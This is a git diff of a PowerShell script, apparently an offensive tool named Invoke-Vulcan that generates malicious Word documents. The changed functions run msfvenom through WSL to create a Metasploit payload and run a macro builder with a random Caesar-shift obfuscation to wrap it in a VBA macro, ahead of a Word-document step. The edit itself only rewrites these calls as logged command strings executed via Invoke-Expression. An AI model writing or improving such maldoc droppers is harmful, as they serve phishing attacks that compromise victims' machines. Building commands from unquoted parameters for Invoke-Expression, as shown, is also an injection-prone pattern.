@@ -96,14 +96,22 @@ function Invoke-Vulcan {
 function Create_Payload($Payload, $PayloadOptions, $PayloadOutput) {
     Write-Host "[i] Creating payload..."
     $WSLPath = wsl.exe --exec wslpath -a $PayloadOutput
-    wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath
-    Write-Host "[i] Payload written to:" $PayloadOutput
+    $Command = "wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath"
+
+    Write-Host "[i] Running command: $Command"
+    Invoke-Expression -Command $Command | Out-Null
+    Write-Host "[i] Payload written to: $PayloadOutput"
 }
 
 function Create_VBAMacro($BAMBin, $BAMInput, $BAMOutput) {
     Write-Host "[i] Creating VBA macro..."
     $CaesarShift = Get-Random -Minimum 1 -Maximum 25
-    & $BAMBin -w doc -p no -s indirect -c $CaesarShift -i $BAMInput -o $BAMOutput
+    $Command = "$BAMBin -w doc -p no -s indirect -c $CaesarShift -i $BAMInput -o $BAMOutput"
+
+    
+    Write-Host "[i] Running command: $Command"
+    Invoke-Expression -Command $Command | Out-Null
+    Write-Host "[i] VBA macro written to: $BAMOutput"
 }
 
 function Create_WordDocument($BAMOutput, $Output) {
